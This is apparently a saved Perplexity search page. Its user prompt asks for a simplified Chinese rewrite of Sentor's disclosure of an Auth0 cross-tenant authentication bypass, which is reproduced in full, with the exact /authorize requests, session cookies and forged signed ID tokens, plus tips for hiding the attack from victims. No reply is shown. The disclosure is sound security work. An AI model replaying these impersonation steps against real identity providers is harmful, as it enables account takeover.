---
title: 使用最简单的表达方式，重新描述下面内容，重点在于介绍清楚技术知识点，使得人们更易于看明白。扩展对应的内容，增加接地气的实际应用例子和对应的demo代码，让中国人更好理解。注意减少偏见的内容、晦涩难懂的内容、错误的内容、冗余的内容、信息量低的内容，以markdown格式输出。加上更多案例和准确的数值指标，直接表达重写后的结果，不要输出其他无关内容。 ------------ Start News Vulnerability disclosure: Authentication bypass in Auth0 authentication-bypass Vulnerability 24 October, 2023 Vulnerability disclosure: Authentication bypass in Auth0 This blog post is written by Laban Sköllermark, pentester and IT security consultant at Sentor, a part of Accenture Security. This vulnerability is not the same as the session fixation, and in my opinion much more impactful. At Sentor we often see vulnerabilities in authentication, authorization and session management during pentests of our clients’ web applications when they have implemented it themselves. The general recommendation in the industry is to use standard authentication and authorization implementations in frameworks rather than implementing everything yourself. The reason for this is that it is very easy to make mistakes. This is like the popular and widely accepted recommendation “don’t roll your own crypto”. But there can be flaws in any system – even the big and widespread solutions for authentication and authorization. There are a lot of terms with abbreviations in this area: Identity Access Management (IAM) / Identity Provider (IdP) / IdP as a Service (IdPaaS) / Identity as a Service (IDaaS). When I found the session fixation problem in Auth0, I needed to repeat that attack and make sure that I could create a working Proof of Concept (PoC) before reporting it to Auth0. That was when I stumbled upon this, much worse, vulnerability! In certain usage scenarios of Auth0, it lets an attacker impersonate any victim in an Auth0 customer’s system, simply by knowing the victim’s email address. Disclaimer: Auth0 have only acknowledged receipt of my vulnerability report and not confirmed my assumptions. They have since then changed the behavior of their system so that this vulnerability is not present anymore. Because of that and due to my 90-day coordinated disclosure deadline has passed, Sentor are now publishing the details. About Auth0 by Okta If you read the previous post on session fixation and don’t need a recap, you can skip this section. Auth0 is quite well-known in the web application sphere. They started in 2013 and offered a Software as a Service (SaaS) for identity management. They have published a lot of open-source Software Development Kits (SDKs) on GitHub, like the java-jwt library for signing and verifying JSON Web Tokens (JWTs) in Java. They are also the ones behind the site jwt.io, which is mainly for decoding and verifying JWTs. You can also use the site to experiment with signing. Auth0 was acquired by Okta (the process started in 2021 and was completed in 2022). Their solution, which has been called just “Auth0” previously, is becoming Okta Customer Identity Cloud, but I will use “Auth0” throughout this blog post. Auth0 can be used for federated login using for instance Microsoft, Google and GitHub. When you set up your tenant, you can let Auth0 be the directory with users and passwords. auth0 login The login page above can be customized both in terms of settings and its design. You can redirect your users to log in on your Auth0 tenant at [example].eu.auth0.com or you can include the login box in your web application with Auth0’s JavaScript. You can also implement your own login logic by using Auth0’s API. If the domain presenting the login form is not the Auth0 tenant ([example].eu.auth0.com), an Auth0 non-default feature called Cross Origin Authentication must be enabled. Modern browsers do not let you post form data across domains, such as from app.example.com to [example].eu.auth0.com, but this can be solved by enabling the Auth0 feature Custom Domain which lets you point your subdomain login.example.com to Auth0. In this way, your application at app.example.com is allowed to post form data to it (login.example.com) because it is under the same domain. OAuth 2.0, OIDC, access tokens, ID tokens, JWTs… There are a lot of terms around modern web-based identity management and many standards to keep track of. This is not the time to properly introduce them all, but let’s agree that it’s hard to understand all aspects and get everything correct. One thing that I think that many, me included, have misunderstood is the difference between access tokens and ID tokens. From oauth.net: - ID tokens are JWTs. Access tokens can be JWTs but may also be a random string. - ID tokens should never be sent to an API. Access tokens should never be read by the client. And Microsoft says: ID tokens shouldn't be used for authorization purposes. Access tokens are used for authorization. The claims provided by ID tokens can be used for UX inside your application, as keys in a database, and providing access to the client application. Auth0 themselves also make this distinction on several pages in their documentation. A good overview is presented in their article Access Tokens. They use access tokens both in the form of an opaque string, which cannot be validated without calling Auth0’s management API, and in the JWT form, where all information needed for most authorization decisions can be included. When access tokens are on the JWT format they can look very similar to ID tokens. The vulnerability described in this blog post allowed an attacker to have Auth0 to sign a JWT ID token containing a victim's user address. I never checked JWT-based access tokens when this vulnerability was present in Auth0’s systems. At Sentor I have come across many applications which verify JWT ID tokens and trust their contents when making authorization decisions. For reference, this is how the claims in a typical Auth0 ID token might look like: { "nickname": "ts21+auth0-trial2-user1", "name": "ts21+auth0-trial2-user1@sentorlab.se", "picture": "https://s.gravatar.com/avatar/646d0458d3266abaeceaf45ec20376c1?s=480&r=pg&d=https%3A%2F%2Fcdn.auth0.com%2Favatars%2Fts.png", "updated_at": "2023-07-21T10:57:53.472Z", "email": "ts21+auth0-trial2-user1@sentorlab.se", "email_verified": false, "iss": "https://dev-j34aiglnx8fz83sc.us.auth0.com/", "aud": "OliFlQ76DzsMdxbO2nZAm27ozKZosJk4", "iat": 1689937798, "exp": 1689973798, "sub": "auth0|64b97a87b6c808c6f9ccbb3c", "sid": "GIZLfxaAa3Fiyeiw2-OgoqvsZnWcHG4W", "nonce": "whatever" } Finding authentication bypass in Auth0 When I was working on a Proof of Concept attack on the previously disclosed session fixation vulnerability, I created two Auth0 trial tenants. When repeating the attack I stumbled upon this much worse vulnerability – authentication bypass. Below is the report I sent them, but with a few edits on spelling, formatting and some clarifications. Screenshots of Auth0 configuration pages are included in the blog post to make it easier to follow, especially for people not having set up Auth0 tenants themselves. Irrelevant data in HTTP requests and responses has been replaced with [...] and JSON data has been prettified for readability. Hi! My company does not allow bug bounty programs, so I cannot use the Bugcrowd form to report this. While reproducing the session fixation vulnerability which I recently reported, I stumbled upon a much worse problem. Please confirm both when you have read this (successful decryption) and when you have tried to reproduce. The technical details are included below. The Vulnerability Rating Taxonomy (VRT) classification is according to Bugcrowd’s definitions. Target: customer.auth0.com VRT category: Broken Authentication and Session Management VRT subcategory: Authentication Bypass Predicted severity: P1 Critical I wish to know if you consider my finding a security vulnerability, whether you intend to patch it and if that can be done within 90 days. This bug is subject to a 90-day disclosure deadline. After 90 days elapses, the bug report will become visible to the public. Overview I have managed to get one tenant to issue a JWT for a user which only exists in another tenant. All "public" applications such as Single Page Applications (SPAs), which have public /authorize endpoints, are probably vulnerable. Below I have proven the problem between two US-4 tenants in the preview environment. Currently I don't know if the attacker tenant and the victim tenant must be in the same locality, or if the same region (US in this case) is enough. The problem seems to not be reproducible between regions at least (I tried between EU-2 and US-4 with no success). It's also currently not known if the problem exists at all in the production environment. If the tenant test21-sentorlab.eu.auth0.com was successfully "migrated" to the production environment after I upgraded it to the "B2C - Essentials" subscription yesterday (2023-JUL-21), I have reproduced the problem between production and preview environments within a locality (EU-2) as well. The vulnerability exists both after logging in using Universal Login and after using the Cross Origin Authentication (/co/authenticate) endpoint. With the permission of <redacted customer>, I have tried getting a JWT issued for their login-stage.<redacted>.<tld> tenant (<redacted>.edge.tenants.eu.auth0.com) but failed. If their tenant is located in the EU-1 locality, that could explain the failure. I have created several EU tenants, but all ended up in EU-2. <Redacted person at customer> is on vacation so I don't currently know which locality their tenant lives in, and I haven't found a way to determine that as an attacker, either. Probable root cause My analysis of the root cause says that, if a session (sid) has any tenant information at all in it, the /authorize endpoint fails to validate it before issuing tokens. After successfully authenticating as a valid user in an attacker tenant A, the auth0 cookie can be sent to the /authorize endpoint of a victim tenant B and that tenant will happily sign a JWT with its correct key just as if a user with the same email address would have existed in that tenant. An attacker needs to: - Know the domain of a victim tenant - Know a client ID in the victim tenant (public information in most applications but especially for SPAs) - Have their own tenant in the same locality - Know the email address of a victim user, in case a particular victim user needs to be impersonated - Create a user representing the victim (by email address) in the attacker tenant Restrictions Only a Username-Password-Authentication connection has been tested. I am aware of your recommendation to validate the nonce claim in JWTs, but I deem that as unfeasible when for instance having an SPA for logging in and then validating the JWTs in an API backend. I don't think that many customers will have their SPA to either ask their API for a nonce or report a nonce to their API before sending the nonce to the Auth0 login flow. This would have been needed for their API to validate the nonce claim in the incoming JWTs later. If a victim application is validating the sub (subject) claim, it will not accept the forged JWT, because the subject value will be that of the attacker user in the attacker tenant. Also, if the application is checking that the email_verified claim is true, it will not accept the forged JWT unless the attacker manages to fool the victim into verifying the account in the victim tenant. Well, that last assumption did not hold. When writing this blog post I discovered that you could set an email address as verified yourself. Your tenant – your choice. You are the admin and manage your own users, after all. set email as verified I also noticed that you could disable the sending of (enabled by default) email address verification email that is otherwise sent as soon as you add a new user to your Username-Password-Authentication database by first changing from the default Auth0 email provider and then disabling the Verification Email (using Link) email template: That way the victim user won’t get any warning that you are going to impersonate them. How to reproduce I have reproduced the problem between two different trial subscriptions both having a tenant each in the US-4 locality. Note that when this blog post was published, the vulnerability could not be reproduced anymore. VICTIM TENANT: Trial 1: ts21+auth-trial@sentorlab.se Domain: dev-nn41qmsm56z6ffw2.us.auth0.com Client ID: Vz0wYTtjdWPbQ47A2xLtoHtZg5qvv3W7 User: ts21+auth0-user1@sentorlab.se ATTACKER TENANT: Trial 2: ts21+auth-trial2@sentorlab.se Domain: dev-j34aiglnx8fz83sc.us.auth0.com Client ID: POX2AdY3AI1lxK1sGSXqDptHAEUnTBgl User: ts21+auth0-trial2-user1@sentorlab.se After creating a user with the victim’s email address in the attacker tenant and then logging in to the attacker tenant, a request to gain a JWT in the correct (attacker) tenant looks like this: Request GET /authorize?client_id=OliFlQ76DzsMdxbO2nZAm27ozKZosJk4&nonce=whatever&response_type=id_token&prompt=none&redirect_uri=https://test21.sentorlab.se/&scope=openid+profile+email HTTP/2 Host: dev-j34aiglnx8fz83sc.us.auth0.com Cookie: auth0=s%3AGIZLfxaAa3Fiyeiw2-OgoqvsZnWcHG4W.o9oVddeYu%2Fen2MFWug2ONfVRAVrJizcHttELDKDsfqs Response HTTP/2 302 Found Date: Fri, 21 Jul 2023 11:09:58 GMT Content-Type: text/plain; charset=utf-8 Content-Length: 1219 Location: https://test21.sentorlab.se/#id_token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImpnY3l4ekRENHFmOFp3Qm9saFNaSCJ9.eyJuaWNrbmFtZSI6InRzMjErYXV0aDAtdHJpYWwyLXVzZXIxIiwibmFtZSI6InRzMjErYXV0aDAtdHJpYWwyLXVzZXIxQHNlbnRvcmxhYi5zZSIsInBpY3R1cmUiOiJodHRwczovL3MuZ3JhdmF0YXIuY29tL2F2YXRhci82NDZkMDQ1OGQzMjY2YWJhZWNlYWY0NWVjMjAzNzZjMT9zPTQ4MCZyPXBnJmQ9aHR0cHMlM0ElMkYlMkZjZG4uYXV0aDAuY29tJTJGYXZhdGFycyUyRnRzLnBuZyIsInVwZGF0ZWRfYXQiOiIyMDIzLTA3LTIxVDEwOjU3OjUzLjQ3MloiLCJlbWFpbCI6InRzMjErYXV0aDAtdHJpYWwyLXVzZXIxQHNlbnRvcmxhYi5zZSIsImVtYWlsX3ZlcmlmaWVkIjpmYWxzZSwiaXNzIjoiaHR0cHM6Ly9kZXYtajM0YWlnbG54OGZ6ODNzYy51cy5hdXRoMC5jb20vIiwiYXVkIjoiT2xpRmxRNzZEenNNZHhiTzJuWkFtMjdvektab3NKazQiLCJpYXQiOjE2ODk5Mzc3OTgsImV4cCI6MTY4OTk3Mzc5OCwic3ViIjoiYXV0aDB8NjRiOTdhODdiNmM4MDhjNmY5Y2NiYjNjIiwic2lkIjoiR0laTGZ4YUFhM0ZpeWVpdzItT2dvcXZzWm5XY0hHNFciLCJub25jZSI6IndoYXRldmVyIn0.XN8awGcPIiK3gYKV44Zrl3z2q87TNlQ6BWZMdo6fqS3bT6WB0rqtUwN_qaToRU7fGN_4C3FpjphJaaKTIOvONQAICxJMRnlPd9JY4YXB-RtG28urIv0X-b85RwJXFGtPxqbKyVY8cifNrIeyK3UslWrZBiCtI03Q0fVnvjU_Wv4_-YG3qV_hf8IUV4pgKSqc2SVt7qi1YcZ0D9pyQI4km0Dm9NKrQYHPT-TwOMKf2jo0-S_S_3TXq7L7_jfaX-fPXZNmmHhQDQhBcxTedBq81iiiua01f3w80kf3SATCNsLq1vhcXqCBjL6ObGOjqF72S6hke-7nBhOwyRXxNXMMSg [...] Set-Cookie: auth0=s%3AGIZLfxaAa3Fiyeiw2-OgoqvsZnWcHG4W.o9oVddeYu%2Fen2MFWug2ONfVRAVrJizcHttELDKDsfqs; Path=/; Expires=Mon, 24 Jul 2023 11:09:58 GMT; HttpOnly; Secure; SameSite=None [...] Found. Redirecting to https://test21.sentorlab.se/#id_token=[...] Decoded JWT (You can use this jwt.io link to verify it, and as long as my trial subscription is alive, also verify the signature.) { "alg": "RS256", "typ": "JWT", "kid": "jgcyxzDD4qf8ZwBolhSZH" } { "nickname": "ts21+auth0-trial2-user1", "name": "ts21+auth0-trial2-user1@sentorlab.se", "picture": "https://s.gravatar.com/avatar/646d0458d3266abaeceaf45ec20376c1?s=480&r=pg&d=https%3A%2F%2Fcdn.auth0.com%2Favatars%2Fts.png", "updated_at": "2023-07-21T10:57:53.472Z", "email": "ts21+auth0-trial2-user1@sentorlab.se", "email_verified": false, "iss": "https://dev-j34aiglnx8fz83sc.us.auth0.com/", "aud": "OliFlQ76DzsMdxbO2nZAm27ozKZosJk4", "iat": 1689937798, "exp": 1689973798, "sub": "auth0|64b97a87b6c808c6f9ccbb3c", "sid": "GIZLfxaAa3Fiyeiw2-OgoqvsZnWcHG4W", "nonce": "whatever" } The attacker then repeats the /authorize request but replaces the domain and the client ID to the values of the victim tenant: Request GET /authorize?client_id=Vz0wYTtjdWPbQ47A2xLtoHtZg5qvv3W7&nonce=whatever&response_type=id_token&prompt=none&redirect_uri=https://test21.sentorlab.se/&scope=openid+profile+email HTTP/2 Host: dev-nn41qmsm56z6ffw2.us.auth0.com Cookie: auth0=s%3AGIZLfxaAa3Fiyeiw2-OgoqvsZnWcHG4W.o9oVddeYu%2Fen2MFWug2ONfVRAVrJizcHttELDKDsfqs Response HTTP/2 302 Found Date: Fri, 21 Jul 2023 11:16:57 GMT Content-Type: text/plain; charset=utf-8 Content-Length: 1219 Location: https://test21.sentorlab.se/#id_token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjhKYzVZR1cwbXR3MlZSMWU4S3BPcCJ9.eyJuaWNrbmFtZSI6InRzMjErYXV0aDAtdHJpYWwyLXVzZXIxIiwibmFtZSI6InRzMjErYXV0aDAtdHJpYWwyLXVzZXIxQHNlbnRvcmxhYi5zZSIsInBpY3R1cmUiOiJodHRwczovL3MuZ3JhdmF0YXIuY29tL2F2YXRhci82NDZkMDQ1OGQzMjY2YWJhZWNlYWY0NWVjMjAzNzZjMT9zPTQ4MCZyPXBnJmQ9aHR0cHMlM0ElMkYlMkZjZG4uYXV0aDAuY29tJTJGYXZhdGFycyUyRnRzLnBuZyIsInVwZGF0ZWRfYXQiOiIyMDIzLTA3LTIxVDEwOjU3OjUzLjQ3MloiLCJlbWFpbCI6InRzMjErYXV0aDAtdHJpYWwyLXVzZXIxQHNlbnRvcmxhYi5zZSIsImVtYWlsX3ZlcmlmaWVkIjpmYWxzZSwiaXNzIjoiaHR0cHM6Ly9kZXYtbm40MXFtc201Nno2ZmZ3Mi51cy5hdXRoMC5jb20vIiwiYXVkIjoiVnowd1lUdGpkV1BiUTQ3QTJ4THRvSHRaZzVxdnYzVzciLCJpYXQiOjE2ODk5MzgyMTcsImV4cCI6MTY4OTk3NDIxNywic3ViIjoiYXV0aDB8NjRiOTdhODdiNmM4MDhjNmY5Y2NiYjNjIiwic2lkIjoiR0laTGZ4YUFhM0ZpeWVpdzItT2dvcXZzWm5XY0hHNFciLCJub25jZSI6IndoYXRldmVyIn0.SyK3g5k9XBmIyfOfgpjsZUjbp8Z9S7FbmyG9ZKrdvjWe0C0ZzDFRQGWTmapX5tqWGV3Wy8ub1lH00U-e8PPr---SNPhzIAysH5Of_lDPUNmOsu9Umxc6WrUGnd0I92R3Gvhsy7EmDENoU7bN0mDmxsh0vp4Ccbn9nYw6OU4fMRvyFJU2b4DI9QA94FoEZTWi_vSav0pYW7BjGrh--jPXvApTJscnDJbFrIH2KPglm1BIkK1_s3NKkeY3kATXWo8XvjgadNRqwHJvDA8WO0p49yUOCy8B4d2J2w0Bhz56t1aOfIVXf1WpYqWRS5q_hqTTSJpqRrwQKKgRgySw6ZKy5w [...] Set-Cookie: auth0=s%3AGIZLfxaAa3Fiyeiw2-OgoqvsZnWcHG4W.o9oVddeYu%2Fen2MFWug2ONfVRAVrJizcHttELDKDsfqs; Path=/; Expires=Mon, 24 Jul 2023 11:16:57 GMT; HttpOnly; Secure; SameSite=None [...] Found. Redirecting to https://test21.sentorlab.se/#id_token=[...] Decoded JWT (You can use this jwt.io link to decode it, and as long as my trial subscription is alive, also verify the signature.) { "alg": "RS256", "typ": "JWT", "kid": "8Jc5YGW0mtw2VR1e8KpOp" } { "nickname": "ts21+auth0-trial2-user1", "name": "ts21+auth0-trial2-user1@sentorlab.se", "picture": "https://s.gravatar.com/avatar/646d0458d3266abaeceaf45ec20376c1?s=480&r=pg&d=https%3A%2F%2Fcdn.auth0.com%2Favatars%2Fts.png", "updated_at": "2023-07-21T10:57:53.472Z", "email": "ts21+auth0-trial2-user1@sentorlab.se", "email_verified": false, "iss": "https://dev-nn41qmsm56z6ffw2.us.auth0.com/", "aud": "Vz0wYTtjdWPbQ47A2xLtoHtZg5qvv3W7", "iat": 1689938217, "exp": 1689974217, "sub": "auth0|64b97a87b6c808c6f9ccbb3c", "sid": "GIZLfxaAa3Fiyeiw2-OgoqvsZnWcHG4W", "nonce": "whatever" } Note that a user with that email address does not exist in the victim tenant. For the sake of this blog post and to prove the vulnerability after my trial subscriptions have ended and their tenants been deleted, below are the public parts of the Auth0 generated asymmetric keys used to sign the two JWTs above. Well, I could of course have generated the keys myself and faked the whole thing, but I hope Auth0 won’t claim that. Attaching the signing certificates will not help since they are self-signed (root CAs – Certificate Authorities). So, make sure to download the jwks.json files yourself if they are still online when you read this. :) $ curl --silent https://dev-j34aiglnx8fz83sc.us.auth0.com/.well-known/jwks.json | jq .keys[0] { "kty": "RSA", "use": "sig", "n": "vdi2IuC4mkcbiSjc3tz6zs2KwFRryQvojiBV5oRGORNI9ohLdslZx-_GTMeVEJw0Rc3efSqnJBmMzvBuSFgkh_EaqsyzrX3lV827F-KdRSdXFI1jV9OcQzsd2xK5ggZDv8V8FKQHF4cN86g7pcpsSfvFPY1BvNmEuOD-HinEnjdqr0QHAmFK-jOs1RMZAs89l1u4DCfDzMR0zVEqrg8lPMi7GDmHv7pOYMJUgiKZPvS-FqBhJPtpxmbj8IthfN3gA3RahjJGQPbciOSf-MbUnN2k9uLp0-mDA382UTstvLgRpP3PONCp4fbexk2v05UjOQ8s0bTNqDu5OiyKT2PpGQ", "e": "AQAB", "kid": "jgcyxzDD4qf8ZwBolhSZH", "x5t": "xmHHlJN0ainEbNbjkrYph28HXJM", "x5c": [ "MIIDHTCCAgWgAwIBAgIJN6uOgvf7KnClMA0GCSqGSIb3DQEBCwUAMCwxKjAoBgNVBAMTIWRldi1qMzRhaWdsbng4Zno4M3NjLnVzLmF1dGgwLmNvbTAeFw0yMzA3MjAxODA0NDVaFw0zNzAzMjgxODA0NDVaMCwxKjAoBgNVBAMTIWRldi1qMzRhaWdsbng4Zno4M3NjLnVzLmF1dGgwLmNvbTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAL3YtiLguJpHG4ko3N7c+s7NisBUa8kL6I4gVeaERjkTSPaIS3bJWcfvxkzHlRCcNEXN3n0qpyQZjM7wbkhYJIfxGqrMs6195VfNuxfinUUnVxSNY1fTnEM7HdsSuYIGQ7/FfBSkBxeHDfOoO6XKbEn7xT2NQbzZhLjg/h4pxJ43aq9EBwJhSvozrNUTGQLPPZdbuAwnw8zEdM1RKq4PJTzIuxg5h7+6TmDCVIIimT70vhagYST7acZm4/CLYXzd4AN0WoYyRkD23Ijkn/jG1JzdpPbi6dPpgwN/NlE7Lby4EaT9zzjQqeH23sZNr9OVIzkPLNG0zag7uTosik9j6RkCAwEAAaNCMEAwDwYDVR0TAQH/BAUwAwEB/zAdBgNVHQ4EFgQUhUgX1Mx8SkubU5lJKWLc1VscHQ8wDgYDVR0PAQH/BAQDAgKEMA0GCSqGSIb3DQEBCwUAA4IBAQAKysua0zBQy7lo0Jyvnjto8mgxsL8EMThteRKOOeNEtPPASl1smwyH8c3eSI6i237gmw+hWL1DtEYFyp7lkNFzmjV/yAzUvjwFbwE4E7t9fDbdoS7m3QZmf+Kb5QI1hDvGA0OQ5oxMi2qbWGCMb+mPppUbc1mWaIkgdu0LSFhPtl1EI0vT1UUHm9/U/YQ+sR08Sia6eXgcHZkVJMtSqg5VYirOmd64cYQHPCeQ5SvXjb3sKEJvCLvJAbzPrLcjFMOdtb8DSZL0kaKKIHMGlylrvNET/g269ga5h4r4+R0IqdKpKl+NM6pcrRzATivRFBhKuVhx0wo5oUeKStmML869" ], "alg": "RS256" } $ curl --silent https://dev-nn41qmsm56z6ffw2.us.auth0.com/.well-known/jwks.json | jq .keys[0] { "kty": "RSA", "use": "sig", "n": "vhgYm8bLxWtU2MiYqBbbpgu9-B0jZW0BNNPSFbIbndYB3dHISxCSfwLETjDaJzQoEvWdoU-UvKF9SGcJ9H8NYGl4Bz45vIhToJbx1oVVZXXUpuM2cmARr3eV-_xZpEj4JjuDzo6jAMe-2wt1iXEKiraUAqzSiVucAKnU31fKnM5R5x4BFjquGek9Bh-OXIreBe_Pxpr8--mJJI1T7z4ki6-mgefihSvJNJcCDB5iGpNl6mMRWzBazKEsf_3bz2IelXi0WfigGqFoVY7-XPQrYHR-doFxg9EvIh6q4uvln02sZt0NATGf_qIV7bs108ZN5bzrAl0NTl3-coONlO0SkQ", "e": "AQAB", "kid": "8Jc5YGW0mtw2VR1e8KpOp", "x5t": "_pYx_hdrb7lY3aVTQBQfVi2UNNY", "x5c": [ "MIIDHTCCAgWgAwIBAgIJIJL/syBP6bA7MA0GCSqGSIb3DQEBCwUAMCwxKjAoBgNVBAMTIWRldi1ubjQxcW1zbTU2ejZmZncyLnVzLmF1dGgwLmNvbTAeFw0yMzA2MjgwOTMwNTdaFw0zNzAzMDYwOTMwNTdaMCwxKjAoBgNVBAMTIWRldi1ubjQxcW1zbTU2ejZmZncyLnVzLmF1dGgwLmNvbTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAL4YGJvGy8VrVNjImKgW26YLvfgdI2VtATTT0hWyG53WAd3RyEsQkn8CxE4w2ic0KBL1naFPlLyhfUhnCfR/DWBpeAc+ObyIU6CW8daFVWV11KbjNnJgEa93lfv8WaRI+CY7g86OowDHvtsLdYlxCoq2lAKs0olbnACp1N9XypzOUeceARY6rhnpPQYfjlyK3gXvz8aa/PvpiSSNU+8+JIuvpoHn4oUryTSXAgweYhqTZepjEVswWsyhLH/9289iHpV4tFn4oBqhaFWO/lz0K2B0fnaBcYPRLyIequLr5Z9NrGbdDQExn/6iFe27NdPGTeW86wJdDU5d/nKDjZTtEpECAwEAAaNCMEAwDwYDVR0TAQH/BAUwAwEB/zAdBgNVHQ4EFgQUy+FuNyPaTiD86DJDHpabBCRuKbwwDgYDVR0PAQH/BAQDAgKEMA0GCSqGSIb3DQEBCwUAA4IBAQCfRBEuUgtgAPACbKPjnEuZaNmjAtoDoS/6aFPlAq1ekLQjJAnqku3Qeda0cVAzEXwGE+Kv8Wx/+V2qKz1KtSuSqgB4PdVJejZQR/2Pl3rfmJITiRwv+NQhT7fH4+Q85QHit2zLH0BDNhlJy0ce+T+iZ/CEDVwlLdeY/OWpUBbzqBji9uls4IUSl8af59E3EfXl73UnZkMgxeTsinupxIRK0Vom92FErCBpwndWl5iOgZhLXQf89qVZ77TSiDjdKAUiKMYeTyrdvwdHKlIJP+PSNMP0I0GlPLaQrDqOuctuFtnSuBNn45lKNivTDi61uzOzwFowjId7eAG3xCLPXmaX" ], "alg": "RS256" } Recommendations The following recommendation to mitigate the vulnerability was sent to Auth0: - Always check which tenant and client ID a session is valid for before trusting any data in it. Similarities with “nOAuth” Researchers at Descope discovered the so-called nOAuth vulnerability and published a blog post the 20th of June 2023 called nOAuth: How Microsoft OAuth Misconfiguration Can Lead to Full Account Takeover. That vulnerability was in the combination of Microsoft Entra ID (formerly Azure AD) and how some application developers trusted the email claim of Microsoft issued JWTs. Exploiting that vulnerability also involved an attacker-controlled tenant and allowed impersonation of users. The day before publication of this blog post I went through Okta’s different blog platforms (they have many) and found the article Saying “No Thanks” to nOAuth, published the 5th of August 2023. It’s a response to the nOAuth vulnerability and ends with how Okta’s both platforms are different – both Workforce Identity Cloud but also Customer Identity Cloud (Auth0). Given that Okta/Auth0 knew about my vulnerability report at the time, and maybe they also already had mitigated it, a few citations are a bit ironic in my opinion: By contrast, the Okta Workforce Identity Cloud (WIC) is architected around per-tenant (“Okta Org”) federation, and it's up to the Org administrator to determine what identifiers to support. Our tenant boundary is strict: an org administrator can't impersonate users in a different org. Is it careful wording there? They don’t say anything about Customer Identity Cloud. While Okta Customer Identity offers the option to allow unverified emails to be used as part of Self-Service Registration (see screenshot below); the blast radius is again squarely within the tenant itself. Well, they might just have mitigated such a vulnerability... Furthermore, the issuer of Microsoft tokens is "MicrosoftOnline", whereas for Okta it is your-org.okta.com. In this vulnerability it does not have any difference since it’s possible to have that issuer to issue tokens with attacker-controlled information and signed with the correct keys of the issuer. But it’s good to have several layers of security! Previous Auth0 authentication bypass vulnerabilities In 2017, the company Cinta Infinita found and reported an authentication bypass vulnerability in the Auth0 platform, which they disclosed publicly a year later in their blog post Knocking Down the Big Door – How We Bypassed the Auth0 Authentication. On the same day, Auth0 published the security bulletin CVE-2018-6873: Security Vulnerability in the Auth0 Authentication Service and their Chief Security Officer (CSO) wrote about the whole process in the blog post Managing and Mitigating Security Vulnerabilities at Auth0. Those who are familiar with JWT security know of the “none algorithm attack”. Auth0 apparently blocklisted “alg”:”none”, but did that in a case sensitive manner. Setting “alg”:”nonE” in the JWT header completely bypassed the signature check, which Insomnia Security (now CyberCX) found out in 2019. See their blog post JSON Web Token Validation Bypass in Auth0 Authentication API and Auth0’s response in their blog post Insomnia Security Disclosure. Auth0 also had a “algorithm confusion” vulnerability when validating JWT signatures. See their security bulletin CVE-2022-23539, CVE-2022-23541, CVE-2022-23540: Security Update for jsonwebtoken or the guest blog post by Tim McLean who found the problem: Critical vulnerabilities in JSON Web Token libraries. There have been several other JWT validation vulnerabilities in Auth0 libraries in the past: - CVE-2020-15084: Security Update for express-jwt Library - CVE-2019-7644: Security Vulnerability in Auth0-WCF-Service-JWT - CVE-2019-13483: Security Vulnerability in Passport-SharePoint - CVE-2020-15240: Security Update for omniauth-auth0 JWT Validation And one SAML (Security Assertion Markup Language) validation vulnerability as well: - CVE-2022-23505: Security Update for passport-wsfed-saml2 Library
date: 2025-02-09
source: https://www.perplexity.ai/search/shi-yong-zui-jian-dan-de-biao-0DFnnAv4TtupHS024idCvg
---

**User:** 使用最简单的表达方式，重新描述下面内容，重点在于介绍清楚技术知识点，使得人们更易于看明白。扩展对应的内容，增加接地气的实际应用例子和对应的demo代码，让中国人更好理解。注意减少偏见的内容、晦涩难懂的内容、错误的内容、冗余的内容、信息量低的内容，以markdown格式输出。加上更多案例和准确的数值指标，直接表达重写后的结果，不要输出其他无关内容。

------------

Start
News
Vulnerability disclosure: Authentication bypass in Auth0 
authentication-bypass
Vulnerability
24 October, 2023

Vulnerability disclosure: Authentication bypass in Auth0
This blog post is written by Laban Sköllermark, pentester and IT security consultant at Sentor, a part of Accenture Security.

This vulnerability is not the same as the session fixation, and in my opinion much more impactful. 

At Sentor we often see vulnerabilities in authentication, authorization and session management during pentests of our clients’ web applications when they have implemented it themselves. The general recommendation in the industry is to use standard authentication and authorization implementations in frameworks rather than implementing everything yourself. The reason for this is that it is very easy to make mistakes. This is like the popular and widely accepted recommendation “don’t roll your own crypto”.  

But there can be flaws in any system – even the big and widespread solutions for authentication and authorization. There are a lot of terms with abbreviations in this area: Identity Access Management (IAM) / Identity Provider (IdP) / IdP as a Service (IdPaaS) / Identity as a Service (IDaaS). 

When I found the session fixation problem in Auth0, I needed to repeat that attack and make sure that I could create a working Proof of Concept (PoC) before reporting it to Auth0. That was when I stumbled upon this, much worse, vulnerability! In certain usage scenarios of Auth0, it lets an attacker impersonate any victim in an Auth0 customer’s system, simply by knowing the victim’s email address.

Disclaimer: Auth0 have only acknowledged receipt of my vulnerability report and not confirmed my assumptions. They have since then changed the behavior of their system so that this vulnerability is not present anymore. Because of that and due to my 90-day coordinated disclosure deadline has passed, Sentor are now publishing the details.  

About Auth0 by Okta
If you read the previous post on session fixation and don’t need a recap, you can skip this section. 

Auth0 is quite well-known in the web application sphere. They started in 2013 and offered a Software as a Service (SaaS) for identity management. They have published a lot of open-source Software Development Kits (SDKs) on GitHub, like the java-jwt library for signing and verifying JSON Web Tokens (JWTs) in Java. They are also the ones behind the site jwt.io, which is mainly for decoding and verifying JWTs. You can also use the site to experiment with signing. 

Auth0 was acquired by Okta (the process started in 2021 and was completed in 2022). Their solution, which has been called just “Auth0” previously, is becoming Okta Customer Identity Cloud, but I will use “Auth0” throughout this blog post. 

Auth0 can be used for federated login using for instance Microsoft, Google and GitHub. When you set up your tenant, you can let Auth0 be the directory with users and passwords. 

auth0 login

The login page above can be customized both in terms of settings and its design. You can redirect your users to log in on your Auth0 tenant at [example].eu.auth0.com or you can include the login box in your web application with Auth0’s JavaScript. You can also implement your own login logic by using Auth0’s API. If the domain presenting the login form is not the Auth0 tenant ([example].eu.auth0.com), an Auth0 non-default feature called Cross Origin Authentication must be enabled. Modern browsers do not let you post form data across domains, such as from app.example.com to [example].eu.auth0.com, but this can be solved by enabling the Auth0 feature Custom Domain which lets you point your subdomain login.example.com to Auth0. In this way, your application at app.example.com is allowed to post form data to it (login.example.com) because it is under the same domain.

OAuth 2.0, OIDC, access tokens, ID tokens, JWTs…
There are a lot of terms around modern web-based identity management and many standards to keep track of. This is not the time to properly introduce them all, but let’s agree that it’s hard to understand all aspects and get everything correct. 

One thing that I think that many, me included, have misunderstood is the difference between access tokens and ID tokens. From oauth.net: 

